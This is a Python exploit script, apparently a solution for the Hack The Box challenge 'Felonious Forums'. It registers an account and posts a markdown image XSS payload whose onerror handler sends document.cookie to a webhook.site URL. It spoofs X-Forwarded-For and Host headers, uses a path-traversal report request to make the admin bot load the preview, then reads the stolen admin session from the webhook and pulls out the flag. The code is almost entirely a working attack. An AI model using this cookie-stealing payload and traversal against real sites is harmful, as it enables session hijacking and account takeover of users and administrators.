import sys
import requests
import urllib3
import urllib.parse
import re
import time
import warnings
import base64

warnings.filterwarnings("ignore", category=DeprecationWarning)
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

##########################################################
#	FUNCTIONS
##########################################################

def decode_token_part(token):
	return base64.b64decode(token.encode() + b'='*(4 - (len(token)%4))).decode()

def register(s, url):
	register_path = url + '/api/register'
	login_path = url + '/api/login'
	data = {'username': 'gwyo', 'password': 'password123'}
	print('\n[+] Trying to register to the application...')
	r = s.post(register_path, json=data)
	print(r.text)
	time.sleep(1)
	print('\n[+] Trying to login to the application...')
	r = s.post(login_path, json=data)
	print(r.text)
	if r.status_code == 403:
		print('[-] Exploit failed <!>')
		sys.exit(1)
	time.sleep(1)
	jwt_token = s.cookies['session']
	print('[+] Found JWT managed session cookie:\t\t%s\n' % jwt_token)
	print(jwt_token)
	p1, p2, p3 = jwt_token.split('.')
	print('Header:\t%s' % decode_token_part(p1))
	print('Body:\t%s' % decode_token_part(p2))
	print('Signature:\t%s' % p3)
	return jwt_token

def send_preview(s, url, token, webhook):
	print("\n[+] Trying to use the preview feature to send markdown reflected as a XSS...")
	new_thread_path = url + '/threads/new'
	cookies = {'session': token}
	s.cookies.clear()
	r = s.get(new_thread_path, cookies=cookies)
	time.sleep(1)
	# print(r.text)
	print(r.headers)
	thread_data = {
	"title": "exploit forum",
	"content": f"""![gwyo]("onerror="window.location.href='{webhook}/?'+document.cookie)""",
	"cat_id": "2"
	}
	timestamp = int(time.time() * 1000)
	headers = {"X-Forwarded-For": "127.0.0.1", "Host": "127.0.0.1:1337"}
	post_preview_path = url + '/threads/preview?' + str(timestamp)
	post_thread_path = url + '/threads/create'
	print(post_preview_path)
	r = s.post(post_preview_path, data=thread_data, headers=headers, cookies=cookies)
	if r.status_code != 200:
		print('[-] Exploit failed to preview the thread <!>')
	report_path = url + '/api/report'
	report_data = {
	"post_id": '../threads/preview?'+str(timestamp)
	}
	r = s.post(report_path, json=report_data, headers=headers)


def get_flag(s, url, webhook):
	print('\n[+] Trying to retrieve responses sent back to the webhook')
	token_id = webhook.split('/')[-1]
	print(token_id)
	headers = {"api-key": token_id}
	r = requests.get('https://webhook.site/token/'+ token_id +'/requests?sorting=newest', headers=headers)
	response = r.json()['data'][0]
	admin_session = response['url'].split('=')[1]
	print('\n[+] Found admin session cookie:\n%s' % admin_session)
	p1, p2, p3 = admin_session.split('.')
	print('Header:\t%s' % decode_token_part(p1))
	print('Body:\t%s' % decode_token_part(p2))
	print('Signature:\t%s' % p3)
	flag = re.search(r'","flag":"(.*)","iat":', decode_token_part(p2)).group(1)
	return flag

def show_usage():
	print('[+] Usage: %s <TARGET> <WEBHOOK>' % sys.argv[0])
	print('[+] Example: %s 127.0.0.1:1337 https://webhook.site/XXXXXXXX-XXXX-XXXX-XXXX-XXXXXXXXXXXX' % sys.argv[0])
	sys.exit(-1)

##########################################################
#	MAIN
##########################################################

def main():
	print('[+] HTB Challenge: Felonious Forums')
	try:
		url = 'http://' + sys.argv[1].strip()
		webhook = sys.argv[2].strip()
	except IndexError:
		show_usage()
	s = requests.Session()
	s.proxies = proxies		# Comment this line to disable proxying
	s.verify = False
	try:
		r = s.get(url, allow_redirects=False)
		time.sleep(1)
		if '<h1>Error</h1>' in r.text or 'Server Error: Gateway Timeout' in r.text:
			print('\n[-] HOST seems to be down <!>')
			sys.exit(-1)
		else:
			print('[+] Trying to find Vulnerabilities to get admin cookie\n')
			time.sleep(1)
			parsed_url = urllib.parse.urlparse(url)
			host = parsed_url.netloc
			if parsed_url.port:
				port = parsed_url.port
			elif parsed_url.scheme == "https":
				port = 443
			elif parsed_url.scheme == "http":
				port = 80
			print(parsed_url)
			url = parsed_url.scheme + '://' + host
			token = register(s, url)
			new_token = send_preview(s, url, token, webhook)
			flag = get_flag(s, url, webhook)
			print('')
			print(flag)
	except requests.exceptions.ProxyError:
		print('[-] PROXY seems to be missconfigured <!>')
	except KeyboardInterrupt:
		sys.exit(1)

if __name__ == "__main__":
	main()
